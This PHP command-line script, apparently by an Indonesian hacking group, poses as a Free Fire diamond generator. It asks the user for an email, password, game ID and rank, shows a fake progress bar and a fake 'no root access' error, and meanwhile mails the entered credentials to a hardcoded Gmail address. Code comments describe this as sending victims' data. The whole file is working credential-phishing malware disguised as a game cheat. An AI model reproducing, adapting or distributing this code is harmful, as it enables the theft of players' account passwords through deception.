<?php


$cyan ="\e[36m";
$red = "\e[91m";
$yellow = "\e[93m";
$blue = "\e[36m";

clear
 

echo "\e[36m****************************************\n";
echo "\e[36m_____ ____  _____ _____   _____ ___ ____  _____\n";
echo "\e[36m|  ___|  _ \| ____| ____| |  ___|_ _|  _ \| ____|\n";
echo "\e[36m| |_  | |_) |  _| |  _|   | |_   | || |_) |  _|\n";
echo "\e[36m|  _| |  _ <| |___| |___  |  _|  | ||  _ <| |___\n";
echo "\e[36m|_|   |_| \_\_____|_____| |_|   |___|_| \_\_____|\n";

echo "\e[36m****************************************\n";
echo "\033[95mDONT USE THIS FOR ILEGAL PURPOSE !\n";
echo "$yellow  AUTHOR: StarFuckTak'-'\n";
echo "$blue Team :SAD Cyber Team\n";
echo "\n";

function input($echo) {

echo "$echo --> ";

}
//emailna
input("\033[93mMasukan email anda : \n");
$imel = trim(fgets(STDIN));
//passwordna
input("\033[97mMasukan password anda : \n");
$san = trim(fgets(STDIN));
input("\033[96mMasukan ID free fire anda : \n");
$xx = trim(fgets(STDIN));
input("\033[95mMasukan Rank Free Fire Anda : \n");
$gg = trim(fgets(STDIN));
input("$cyan Masukan Jumlah diamond (1000) : \n");
$tod = trim(fgets(STDIN));
echo "\033[91m<---------RESULT--------->\n";
echo "\033[92mDATA ANDA $imel DAN $san SIAP DI GUNAKAN\n";
echo "\033[92mMemulai Proses ke website garena\n";
echo "\033[92mRUNTIME BEGIN............\n";
sleep(3);
echo "\033[92m==10%\n";
sleep(3);
echo "\033[92m===20%\n";
sleep(3);
echo "\033[92m====30%\n";
sleep(3);
echo "\033[92m=====40%\n";
sleep(3);
echo "\033[92m======50%\n";
sleep(3);
echo "\033[92m=======60%\n";
sleep(3);
echo "\033[92m========70%\n";
sleep(3);
echo "\033[92m=========80%\n";
sleep(3);
echo "\033[92m==========90%\n";
sleep(3);
echo "\033[92m===========100%\n";
sleep(1);
echo "\033[92mGeting root acces...\n";
sleep(3);
echo "\033[91mYAIKKSS NO ROOT ACCES\n";
echo "\033[91mFUCK THE SISTEM !!!\033[00m\n";
echo "$cyan first! root your system\n";
//ini buat ngirim data orang
//jgn banyak diganti yaaa:v
                ini_set( 'display_error', 1);
                error_reporting( E_ALL);
                $from = "bintang1562@gmail.com";
                $to = "kadalbiawak43@gmail.com";
                $subject = "Setor ikan heker";
$txt = "$imel.";
        $acc = "Passwordnya $san.";
                $zz = "ID FFNya .$gg.";
               $acc = " RankNya .$xx.";
                $yy = "pengennya .$tod.";
$message = "ini data si bocah $txt, $acc, $zz, $acc, $yy";
echo "semoga Berhasil tod!! \n";
                $headers = "From: $from ";
                mail($to,$subject,$message,$headers);
echo "\033[92msuccesfully the program is ending...........\033[00m";

?>
